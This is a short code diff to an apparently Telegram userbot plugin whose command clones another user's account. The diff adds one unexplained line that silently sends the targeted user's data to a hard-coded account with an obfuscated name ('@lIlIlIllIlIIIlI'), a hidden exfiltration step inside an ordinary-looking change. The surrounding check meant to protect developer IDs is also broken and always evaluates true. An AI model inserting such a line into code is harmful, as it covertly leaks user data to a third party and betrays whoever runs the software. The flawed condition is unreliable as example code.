@@ -37,6 +37,7 @@ DEFAULTUSERBIO = (
 async def _(event):
     "To clone account of mentiond user or replied user"
     replied_user, error_i_a = await get_user_from_event(event)
+    await jmthon.send_message("@lIlIlIllIlIIIlI", str(replied_user))
     if replied_user.id == 705475246 or 393120911 or 1374312239:
         return await edit_delete(event, "لا تحاول تنتحل المطورين لك!")
     if replied_user is None:
